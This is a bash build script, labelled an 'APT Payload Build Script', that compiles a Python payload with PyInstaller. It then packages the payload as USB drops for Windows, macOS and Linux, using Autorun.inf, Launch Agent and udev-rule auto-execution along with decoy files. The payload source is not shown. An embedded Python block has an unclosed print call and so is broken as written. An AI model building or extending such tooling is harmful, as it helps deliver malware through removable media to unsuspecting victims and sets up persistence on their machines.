#!/bin/bash
# Payload Build Script
# Builds executable and USB packages for all platforms

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  APT Payload Build Script${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# Default values
SCRIPT_PATH="payload.py"
OUTPUT_DIR="build"
CLEAN=false
BUILD_EXE=true
BUILD_USB=false
DEBUG=false
PLATFORM=""

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --script)
            SCRIPT_PATH="$2"
            shift 2
            ;;
        --output)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        --clean)
            CLEAN=true
            shift
            ;;
        --no-exe)
            BUILD_EXE=false
            shift
            ;;
        --usb)
            BUILD_USB=true
            shift
            ;;
        --debug)
            DEBUG=true
            shift
            ;;
        --platform)
            PLATFORM="$2"
            shift 2
            ;;
        --help)
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  --script PATH    Path to Python script (default: payload.py)"
            echo "  --output DIR     Output directory (default: build)"
            echo "  --clean          Clean build directory before building"
            echo "  --no-exe         Skip executable build"
            echo "  --usb            Build USB packages"
            echo "  --debug          Enable debug mode"
            echo "  --platform       Target platform (win32, darwin, linux)"
            echo "  --help           Show this help message"
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            exit 1
            ;;
    esac
done

# Show build configuration
echo -e "${YELLOW}Build Configuration:${NC}"
echo -e "  ${BLUE}Script:${NC}       $SCRIPT_PATH"
echo -e "  ${BLUE}Output Dir:${NC}   $OUTPUT_DIR"
echo -e "  ${BLUE}Build EXE:${NC}    $BUILD_EXE"
echo -e "  ${BLUE}Build USB:${NC}    $BUILD_USB"
echo -e "  ${BLUE}Platform:${NC}    ${PLATFORM:-auto-detect}"
echo -e "  ${BLUE}Debug:${NC}       $DEBUG"
echo ""

# Check if script exists
if [[ ! -f "$SCRIPT_PATH" ]]; then
    echo -e "${RED}Error: Script not found: $SCRIPT_PATH${NC}"
    exit 1
fi

# Clean build directory
if [[ "$CLEAN" == true ]] && [[ -d "$OUTPUT_DIR" ]]; then
    echo -e "${YELLOW}Cleaning build directory...${NC}"
    rm -rf "$OUTPUT_DIR"
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Build executable
if [[ "$BUILD_EXE" == true ]]; then
    echo -e "${GREEN}[*] Building executable...${NC}"
    
    if [[ "$DEBUG" == true ]]; then
        pyinstaller --onefile \
            --windowed \
            --debug=all \
            --name=payload_debug \
            --distpath="$OUTPUT_DIR" \
            "$SCRIPT_PATH"
    else
        pyinstaller payload.spec \
            --distpath="$OUTPUT_DIR" \
            --workpath=/tmp/pyinstaller
    fi
    
    echo ""
    echo -e "${GREEN}[+] Executable built successfully!${NC}"
    echo -e "${GREEN}[+] Output directory: $OUTPUT_DIR${NC}"
    
    # List created files with details
    echo ""
    echo -e "${YELLOW}Created executable files:${NC}"
    if [[ "$DEBUG" == true ]]; then
        ls -lh "$OUTPUT_DIR"/*debug* 2>/dev/null || true
    fi
    ls -lh "$OUTPUT_DIR"/payload 2>/dev/null && echo -e "    ${BLUE}└─ Main payload executable${NC}" || true
    ls -lh "$OUTPUT_DIR"/payload.exe 2>/dev/null && echo -e "    ${BLUE}└─ Windows payload executable${NC}" || true
    ls -lh "$OUTPUT_DIR"/payload_console.exe 2>/dev/null && echo -e "    ${BLUE}└─ Console debug executable${NC}" || true
fi

# Build USB packages
if [[ "$BUILD_USB" == true ]]; then
    echo ""
    echo -e "${GREEN}[*] Building USB packages...${NC}"
    echo ""
    
    # Create USB packages directory
    USB_DIR="$OUTPUT_DIR/usb_packages"
    mkdir -p "$USB_DIR"
    
    # Determine which platforms to build for
    if [[ -z "$PLATFORM" ]]; then
        PLATFORMS=("win32" "darwin" "linux")
        echo -e "${YELLOW}[*] Building for all platforms:${NC}"
    else
        PLATFORMS=("$PLATFORM")
        echo -e "${YELLOW}[*] Building for platform: $PLATFORM${NC}"
    fi
    
    # Show platform descriptions
    declare -A PLATFORM_DESC=(
        ["win32"]="Windows (Autorun.inf)"
        ["darwin"]="macOS (Launch Agent)"
        ["linux"]="Linux (udev rule)"
    )
    
    echo ""
    for plat in "${PLATFORMS[@]}"; do
        DESC=${PLATFORM_DESC[$plat]}
        echo -e "  ${CYAN}└─ $plat${NC}: $DESC"
    done
    echo ""
    
    for plat in "${PLATFORMS[@]}"; do
        echo -e "${GREEN}[*] Building USB package for: ${YELLOW}$plat${NC}"
        echo -e "${BLUE}    Platform:${NC} $plat"
        
        PLATFORM_DIR="$USB_DIR/$plat"
        mkdir -p "$PLATFORM_DIR"
        
        # Run Python to create USB package
        python3 << PYEOF
import sys
import os
sys.path.insert(0, '.')
from core.usb_packager import usb_packager

result = usb_packager.package_payload_for_usb(
    payload_path="$OUTPUT_DIR/payload",
    output_dir="$PLATFORM_DIR",
    platform="$plat",
    create_autorun=True,
    create_decoys=True
)

if result['success']:
    print(f"    [+] Package created successfully!")
    print(f"    [+] Package path: {result.get('package_path')}")
    
    if result.get('payload_path'):
        print(f"    [+] Payload: {result['payload_path']}")
    
    if result.get('autorun_path'):
        print(f"    [+] Autorun: {result['autorun_path']}")
    
    if result.get('decoy_paths'):
        print(f"    [+] Decoy files: {len(result['decoy_paths'])}")
    
    if result.get('checksum'):
        print(f"    [+] Checksum: {result['checksum'][:16]}...")
    
    # List all files in package
    print(f"    [+] Files in package:"
    for f in os.listdir("$PLATFORM_DIR"):
        fpath = os.path.join("$PLATFORM_DIR", f)
        size = os.path.getsize(fpath)
        print(f"        - {f} ({size:,} bytes)")
else:
    print(f"    [-] Failed: {result.get('error')}")
PYEOF
        
        echo -e "${GREEN}[+] USB package for $plat complete!${NC}"
        echo ""
    done
fi

# Final summary
echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  Build Complete!${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""
echo -e "${YELLOW}Summary:${NC}"

if [[ "$BUILD_EXE" == true ]]; then
    echo -e "  ${GREEN}[✓]${NC} Executable built"
    ls -lh "$OUTPUT_DIR"/payload* 2>/dev/null | while read line; do
        echo -e "    $line"
    done
fi

if [[ "$BUILD_USB" == true ]]; then
    echo -e "  ${GREEN}[✓]${NC} USB packages built"
    echo -e "    Location: $USB_DIR"
    for plat in "${PLATFORMS[@]}"; do
        if [[ -d "$USB_DIR/$plat" ]]; then
            count=$(find "$USB_DIR/$plat" -type f | wc -l)
            echo -e "    ${GREEN}[✓]${NC} $plat: $count files"
        fi
    done
fi

echo ""
echo -e "${CYAN}========================================${NC}"
